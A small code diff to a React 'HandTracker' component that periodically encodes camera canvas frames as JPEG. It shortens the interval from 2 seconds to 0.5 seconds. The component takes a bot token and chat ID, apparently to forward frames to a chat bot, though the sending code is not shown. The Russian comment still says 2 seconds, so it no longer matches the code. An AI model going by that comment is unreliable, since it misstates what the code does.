@@ -208,7 +208,7 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
                     }
                   }, 'image/jpeg', 0.8);
                 }
-              }, 2000); // Увеличили интервал до 2 секунд
+              }, 500); // Увеличили интервал до 2 секунд
             }
           } catch (err) {
             console.error('Ошибка при запуске видео:', err);
